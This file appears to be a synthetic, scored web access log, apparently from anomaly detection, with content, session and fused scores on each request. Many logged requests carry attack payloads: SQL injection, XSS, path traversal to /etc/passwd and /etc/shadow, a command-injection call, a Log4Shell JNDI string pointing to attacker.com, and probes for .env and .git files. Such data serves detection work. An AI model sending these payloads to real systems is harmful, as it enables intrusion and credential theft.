score_content,score_session,score_fused,line
1.7059910297393799,0.47385627031326294,1.0899236500263214,205.235.228.204 - - [10/Jan/2025:12:00:31 +0100] "GET /admin HTTP/1.1" 200 10969 "-" "sqlmap/1.5.10#stable"
1.7105156183242798,0.5590396523475647,1.1347776353359222,161.137.216.43 - - [10/Jan/2025:12:00:32 +0100] "GET /admin HTTP/1.1" 200 12395 "https://www.google.com/" "dirb/2.22"
7.905975818634033,948.9017333984375,478.40385460853577,182.9.70.106 - - [10/Jan/2025:12:00:36 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 302 10405 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.8492350578308105,1.3093162775039673,3.579275667667389,45.29.96.201 - - [10/Jan/2025:12:00:37 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 10006 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.799248456954956,984.4642944335938,494.13177144527435,40.49.88.237 - - [10/Jan/2025:12:00:37 +0100] "GET /admin HTTP/1.1" 304 16485 "https://twitter.com/" "nikto/2.5.0"
2.299983501434326,984.3226318359375,493.3113076686859,211.252.241.133 - - [10/Jan/2025:12:00:39 +0100] "GET /assets/app.css HTTP/1.1" 304 3319 "https://www.google.com/" "sqlmap/1.5.10#stable"
5.856922626495361,1.3295913934707642,3.5932570099830627,30.2.80.239 - - [10/Jan/2025:12:00:40 +0100] "GET /search?q=camera HTTP/1.1" 200 17216 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2908584177494049,0.46559879183769226,0.3782286047935486,6.148.195.80 - - [10/Jan/2025:12:00:40 +0100] "GET /wp-login.php HTTP/1.1" 200 10339 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
5.954768657684326,7.091327667236328,6.523048162460327,172.31.70.39 - - [10/Jan/2025:12:00:41 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 14554 "https://example.com/" "curl/7.68.0"
0.3192732632160187,0.487241268157959,0.40325726568698883,141.82.70.37 - - [10/Jan/2025:12:00:41 +0100] "GET /.git/config HTTP/1.1" 200 11579 "https://twitter.com/" "python-requests/2.31.0"
5.8506760597229,1.4868589639663696,3.668767511844635,139.114.13.34 - - [10/Jan/2025:12:00:42 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 201 11199 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.5362325310707092,0.686803936958313,0.6115182340145111,101.46.181.153 - - [10/Jan/2025:12:00:47 +0100] "GET /.env HTTP/1.1" 200 14074 "https://twitter.com/" "nikto/2.5.0"
7.777937412261963,951.5980834960938,479.68801045417786,21.250.237.194 - - [10/Jan/2025:12:00:49 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 302 17581 "https://twitter.com/" "nikto/2.5.0"
0.20683978497982025,0.5970015525817871,0.4019206687808037,176.165.182.197 - - [10/Jan/2025:12:00:50 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 10270 "https://news.ycombinator.com/" "nikto/2.5.0"
11.245233535766602,3671.335205078125,1841.2902193069458,67.234.94.101 - - [10/Jan/2025:12:00:51 +0100] "GET /assets/app.css HTTP/1.1" 401 1263 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.680973768234253,0.19821958243846893,0.9395966753363609,90.123.119.217 - - [10/Jan/2025:12:00:53 +0100] "GET /admin HTTP/1.1" 200 3799 "https://example.com/" "curl/7.68.0"
0.2166857272386551,0.7099241614341736,0.46330494433641434,210.183.204.28 - - [10/Jan/2025:12:00:55 +0100] "GET /../../etc/passwd HTTP/1.1" 200 13393 "https://twitter.com/" "sqlmap/1.5.10#stable"
5.859461784362793,1.4289705753326416,3.6442161798477173,152.106.62.159 - - [10/Jan/2025:12:01:00 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 13233 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
5.824683666229248,0.9153438210487366,3.3700137436389923,209.178.152.111 - - [10/Jan/2025:12:01:01 +0100] "GET /search?q=laptop HTTP/1.1" 200 6923 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
5.690963268280029,1.4822598695755005,3.586611568927765,190.239.183.147 - - [10/Jan/2025:12:01:03 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 2652 "-" "nikto/2.5.0"
5.831109523773193,4.492193698883057,5.161651611328125,46.79.245.104 - - [10/Jan/2025:12:01:07 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 14688 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.4989273250102997,0.27631476521492004,0.38762104511260986,24.56.210.36 - - [10/Jan/2025:12:01:07 +0100] "GET /.env HTTP/1.1" 200 2114 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.875425338745117,1.6180884838104248,3.746756911277771,115.51.53.175 - - [10/Jan/2025:12:01:12 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 19037 "https://example.com/" "sqlmap/1.5.10#stable"
12.75097370147705,3785.084716796875,1898.917845249176,184.252.235.89 - - [10/Jan/2025:12:01:16 +0100] "GET /logout HTTP/1.1" 404 890 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11.539984703063965,3676.44677734375,1843.993381023407,16.95.231.141 - - [10/Jan/2025:12:01:16 +0100] "GET /.env HTTP/1.1" 401 602 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.763088703155518,2.8816633224487305,4.322376012802124,222.8.61.111 - - [10/Jan/2025:12:01:21 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 9347 "https://example.com/" "dirb/2.22"
0.5130611062049866,0.37554800510406494,0.44430455565452576,170.45.122.36 - - [10/Jan/2025:12:01:26 +0100] "GET /.env HTTP/1.1" 200 7021 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
12.656218528747559,3638.81640625,1825.7363123893738,74.224.172.33 - - [10/Jan/2025:12:01:29 +0100] "GET /profile HTTP/1.1" 400 315 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.279771327972412,948.9332275390625,475.60649943351746,169.112.250.254 - - [10/Jan/2025:12:01:29 +0100] "GET /../../etc/passwd HTTP/1.1" 302 16048 "-" "curl/7.68.0"
12.479473114013672,3675.008056640625,1843.7437648773193,155.239.109.160 - - [10/Jan/2025:12:01:30 +0100] "GET /server-status HTTP/1.1" 401 1424 "https://news.ycombinator.com/" "curl/7.68.0"
0.19724375009536743,0.44918903708457947,0.32321639358997345,48.109.155.2 - - [10/Jan/2025:12:01:34 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 7497 "https://www.google.com/" "nikto/2.5.0"
12.55572509765625,3781.11474609375,1896.8352355957031,94.9.251.10 - - [10/Jan/2025:12:01:39 +0100] "GET /server-status HTTP/1.1" 404 1180 "https://example.com/" "nikto/2.5.0"
1.5751391649246216,0.6830456852912903,1.129092425107956,252.220.252.193 - - [10/Jan/2025:12:01:39 +0100] "GET /phpmyadmin HTTP/1.1" 200 17349 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.5287262201309204,0.10505997389554977,0.8168930970132351,176.163.139.205 - - [10/Jan/2025:12:01:43 +0100] "GET /phpmyadmin HTTP/1.1" 200 2658 "https://twitter.com/" "python-requests/2.31.0"
1.9075137376785278,1.0305054187774658,1.4690095782279968,232.121.147.188 - - [10/Jan/2025:12:01:43 +0100] "GET / HTTP/1.1" 200 16898 "https://news.ycombinator.com/" "curl/7.68.0"
1.6494262218475342,0.30725646018981934,0.9783413410186768,178.237.153.192 - - [10/Jan/2025:12:01:45 +0100] "GET /logout HTTP/1.1" 200 1257 "https://twitter.com/" "curl/7.68.0"
5.993043422698975,7.563180446624756,6.778111934661865,14.169.254.75 - - [10/Jan/2025:12:01:47 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 18871 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
12.572251319885254,3676.770751953125,1844.6715016365051,65.34.158.72 - - [10/Jan/2025:12:01:50 +0100] "GET /phpmyadmin HTTP/1.1" 401 569 "https://example.com/" "python-requests/2.31.0"
11.38247013092041,3786.318115234375,1898.8502926826477,169.115.95.207 - - [10/Jan/2025:12:01:50 +0100] "GET /assets/app.js HTTP/1.1" 404 309 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.1801340579986572,983.9751586914062,493.07764637470245,88.252.22.248 - - [10/Jan/2025:12:01:55 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 304 1184 "https://twitter.com/" "curl/7.68.0"
7.9264116287231445,986.5914916992188,497.25895166397095,170.113.186.164 - - [10/Jan/2025:12:01:56 +0100] "GET /search?q=phone HTTP/1.1" 304 7897 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.634592056274414,0.3321906328201294,0.9833913445472717,194.210.30.14 - - [10/Jan/2025:12:02:00 +0100] "GET /profile HTTP/1.1" 200 8763 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
8.045153617858887,954.7227172851562,481.38393545150757,60.98.175.181 - - [10/Jan/2025:12:02:03 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 302 17549 "https://news.ycombinator.com/" "dirb/2.22"
1.4949233531951904,0.6435738205909729,1.0692485868930817,98.174.81.247 - - [10/Jan/2025:12:02:05 +0100] "GET /server-status HTTP/1.1" 200 14806 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.4767159223556519,0.38871654868125916,0.9327162355184555,86.70.69.206 - - [10/Jan/2025:12:02:09 +0100] "GET /server-status HTTP/1.1" 200 9032 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.2771267890930176,984.5641479492188,493.4206373691559,188.173.151.198 - - [10/Jan/2025:12:02:14 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 304 8023 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
0.1274046003818512,1.499462604522705,0.8134336024522781,173.3.213.18 - - [10/Jan/2025:12:02:16 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 446 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2038552612066269,0.5453437566757202,0.37459950894117355,65.50.9.7 - - [10/Jan/2025:12:02:16 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 9383 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
17.433149337768555,4768.61474609375,2393.0239477157593,32.182.246.31 - - [10/Jan/2025:12:02:20 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 429 1306 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
11.169421195983887,3748.551025390625,1879.8602232933044,48.65.76.120 - - [10/Jan/2025:12:02:21 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 403 1424 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.5557358264923096,0.10012626647949219,0.8279310464859009,71.199.16.98 - - [10/Jan/2025:12:02:23 +0100] "GET /dashboard HTTP/1.1" 200 2524 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
5.9161176681518555,6.571841716766357,6.2439796924591064,126.251.238.52 - - [10/Jan/2025:12:02:23 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 2374 "https://www.google.com/" "dirb/2.22"
0.21916137635707855,0.7663907408714294,0.492776058614254,56.158.165.28 - - [10/Jan/2025:12:02:28 +0100] "GET /../../etc/passwd HTTP/1.1" 200 14231 "https://example.com/" "nikto/2.5.0"
1.5473958253860474,0.28093618154525757,0.9141660034656525,199.115.5.230 - - [10/Jan/2025:12:02:28 +0100] "GET /phpmyadmin HTTP/1.1" 200 8311 "https://www.google.com/" "nikto/2.5.0"
2.330068826675415,927.5769653320312,464.95351707935333,39.180.85.232 - - [10/Jan/2025:12:02:33 +0100] "GET /wp-login.php HTTP/1.1" 301 8830 "https://twitter.com/" "dirb/2.22"
5.977806568145752,7.3357954025268555,6.656800985336304,217.187.200.208 - - [10/Jan/2025:12:02:33 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 13335 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.989869594573975,7.484487533569336,6.737178564071655,240.254.92.86 - - [10/Jan/2025:12:02:34 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 17640 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.5572971105575562,0.4356962740421295,0.9964966922998428,21.216.118.195 - - [10/Jan/2025:12:02:34 +0100] "GET /phpmyadmin HTTP/1.1" 200 11243 "https://www.google.com/" "python-requests/2.31.0"
0.5140619874000549,1.9796175956726074,1.2468397915363312,179.100.230.28 - - [10/Jan/2025:12:02:35 +0100] "GET /.env HTTP/1.1" 204 9893 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
7.872101306915283,949.2329711914062,478.55253624916077,10.50.7.185 - - [10/Jan/2025:12:02:35 +0100] "GET /search?q=camera HTTP/1.1" 302 4685 "https://www.google.com/" "python-requests/2.31.0"
5.864117622375488,1.4849919080734253,3.674554765224457,248.5.10.87 - - [10/Jan/2025:12:02:38 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 14822 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.33572104573249817,0.7323629856109619,0.53404201567173,118.241.174.223 - - [10/Jan/2025:12:02:43 +0100] "GET /.git/config HTTP/1.1" 200 17241 "https://twitter.com/" "curl/7.68.0"
2.4137990474700928,946.8353881835938,474.6245936155319,168.5.121.233 - - [10/Jan/2025:12:02:44 +0100] "GET /index.html HTTP/1.1" 302 16120 "-" "python-requests/2.31.0"
0.2213323712348938,0.2864367961883545,0.25388458371162415,232.79.211.204 - - [10/Jan/2025:12:02:45 +0100] "GET /assets/app.css HTTP/1.1" 200 1737 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
12.588990211486816,3642.51025390625,1827.5496220588684,30.128.153.205 - - [10/Jan/2025:12:02:49 +0100] "GET /phpmyadmin HTTP/1.1" 400 217 "-" "Wget/1.20.3 (linux-gnu)"
0.5495604872703552,0.8848634362220764,0.7172119617462158,140.36.83.215 - - [10/Jan/2025:12:02:50 +0100] "GET /.env HTTP/1.1" 200 18973 "-" "Wget/1.20.3 (linux-gnu)"
1.5344666242599487,0.12283755093812943,0.8286520875990391,194.107.44.179 - - [10/Jan/2025:12:02:54 +0100] "GET /phpmyadmin HTTP/1.1" 200 4728 "https://twitter.com/" "sqlmap/1.5.10#stable"
0.2975309491157532,0.5398305654525757,0.41868075728416443,200.41.5.226 - - [10/Jan/2025:12:02:55 +0100] "GET /wp-login.php HTTP/1.1" 200 12425 "-" "nikto/2.5.0"
3.635263681411743,949.0988159179688,476.36703979969025,228.73.107.178 - - [10/Jan/2025:12:02:55 +0100] "GET /phpmyadmin HTTP/1.1" 302 19555 "https://www.google.com/" "nikto/2.5.0"
5.951981067657471,6.9596781730651855,6.455829620361328,62.241.45.157 - - [10/Jan/2025:12:02:56 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 13601 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.700210452079773,0.5501971244812012,1.125203788280487,90.108.2.143 - - [10/Jan/2025:12:02:57 +0100] "GET /about HTTP/1.1" 201 9969 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.6594256162643433,0.8303194642066956,1.2448725402355194,130.57.119.198 - - [10/Jan/2025:12:02:57 +0100] "GET /contact HTTP/1.1" 201 17785 "https://www.google.com/" "sqlmap/1.5.10#stable"
2.4092612266540527,983.2091064453125,492.8091838359833,128.46.41.172 - - [10/Jan/2025:12:02:59 +0100] "GET /.git/config HTTP/1.1" 304 15645 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.70347261428833,2.183655023574829,3.9435638189315796,158.207.228.195 - - [10/Jan/2025:12:03:04 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 200 11054 "-" "nikto/2.5.0"
0.24899478256702423,0.46267709136009216,0.3558359369635582,125.132.30.19 - - [10/Jan/2025:12:03:04 +0100] "GET /assets/app.js HTTP/1.1" 200 1052 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.4825688600540161,0.4661146104335785,0.9743417352437973,59.200.29.84 - - [10/Jan/2025:12:03:08 +0100] "GET /server-status HTTP/1.1" 200 10772 "-" "Wget/1.20.3 (linux-gnu)"
1.5599815845489502,0.36824074387550354,0.9641111642122269,19.121.150.125 - - [10/Jan/2025:12:03:09 +0100] "GET /api/products HTTP/1.1" 200 7330 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.21347197890281677,0.71672523021698,0.4650986045598984,35.118.185.50 - - [10/Jan/2025:12:03:10 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 12338 "https://example.com/" "sqlmap/1.5.10#stable"
2.3095998764038086,929.4612426757812,465.88542127609253,72.35.29.219 - - [10/Jan/2025:12:03:11 +0100] "GET /wp-login.php HTTP/1.1" 301 2054 "https://news.ycombinator.com/" "nikto/2.5.0"
5.8158183097839355,4.251424312591553,5.033621311187744,155.41.203.204 - - [10/Jan/2025:12:03:14 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 9771 "https://twitter.com/" "curl/7.68.0"
1.7243107557296753,0.7402765154838562,1.2322936356067657,126.221.56.152 - - [10/Jan/2025:12:03:18 +0100] "GET /about HTTP/1.1" 200 17197 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
3.5283608436584473,946.1328735351562,474.83061718940735,64.84.112.149 - - [10/Jan/2025:12:03:20 +0100] "GET /server-status HTTP/1.1" 302 8182 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.8637795448303223,0.5749459862709045,1.2193627655506134,11.254.121.188 - - [10/Jan/2025:12:03:21 +0100] "GET / HTTP/1.1" 200 1549 "-" "python-requests/2.31.0"
8.022327423095703,990.6575317382812,499.3399295806885,116.127.62.22 - - [10/Jan/2025:12:03:24 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 304 3311 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.825637340545654,0.9605072140693665,3.3930722773075104,5.123.172.79 - - [10/Jan/2025:12:03:25 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 3073 "https://news.ycombinator.com/" "curl/7.68.0"
569.6439208984375,8182.51611328125,4376.080017089844,198.36.224.181 - - [10/Jan/2025:12:03:29 +0100] "GET / HTTP/1.1" 500 949 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
12.786609649658203,3675.407470703125,1844.0970401763916,99.229.177.86 - - [10/Jan/2025:12:03:31 +0100] "GET /admin HTTP/1.1" 401 144 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.6222307682037354,983.9840698242188,493.80315029621124,159.226.86.189 - - [10/Jan/2025:12:03:34 +0100] "GET /api/products HTTP/1.1" 304 2752 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.29645565152168274,0.5342363715171814,0.41534601151943207,120.159.11.94 - - [10/Jan/2025:12:03:39 +0100] "GET /wp-login.php HTTP/1.1" 200 12079 "https://www.google.com/" "sqlmap/1.5.10#stable"
1.5419971942901611,0.23254668712615967,0.8872719407081604,36.252.86.62 - - [10/Jan/2025:12:03:44 +0100] "GET /phpmyadmin HTTP/1.1" 200 6808 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.615185499191284,947.5164794921875,475.5658324956894,83.91.230.69 - - [10/Jan/2025:12:03:49 +0100] "GET /api/products HTTP/1.1" 302 7487 "https://news.ycombinator.com/" "python-requests/2.31.0"
5.783593654632568,3.0892422199249268,4.436417937278748,129.135.213.32 - - [10/Jan/2025:12:03:51 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 16032 "https://twitter.com/" "nikto/2.5.0"
1.677121639251709,0.5024601221084595,1.0897908806800842,205.173.243.178 - - [10/Jan/2025:12:03:56 +0100] "GET /logout HTTP/1.1" 200 12163 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11.589654922485352,3748.1845703125,1879.8871126174927,246.245.20.28 - - [10/Jan/2025:12:03:59 +0100] "GET /.env HTTP/1.1" 403 590 "https://example.com/" "curl/7.68.0"
5.956039905548096,6.922987937927246,6.439513921737671,134.244.161.6 - - [10/Jan/2025:12:03:59 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 6793 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.2180912345647812,0.7999141812324524,0.5090027078986168,114.189.166.6 - - [10/Jan/2025:12:04:04 +0100] "GET /../../etc/passwd HTTP/1.1" 200 13866 "https://www.google.com/" "python-requests/2.31.0"
16.6920108795166,3640.029052734375,1828.3605318069458,166.86.106.149 - - [10/Jan/2025:12:04:04 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 400 1064 "https://example.com/" "sqlmap/1.5.10#stable"
0.23130455613136292,0.9715492725372314,0.6014269143342972,34.230.203.79 - - [10/Jan/2025:12:04:07 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 18687 "https://example.com/" "curl/7.68.0"
7.903899669647217,984.7093505859375,496.30662512779236,38.91.73.117 - - [10/Jan/2025:12:04:08 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 304 1650 "https://twitter.com/" "curl/7.68.0"
1.6553874015808105,0.22401930391788483,0.9397033527493477,215.182.178.232 - - [10/Jan/2025:12:04:09 +0100] "GET /logout HTTP/1.1" 200 5846 "https://www.google.com/" "sqlmap/1.5.10#stable"
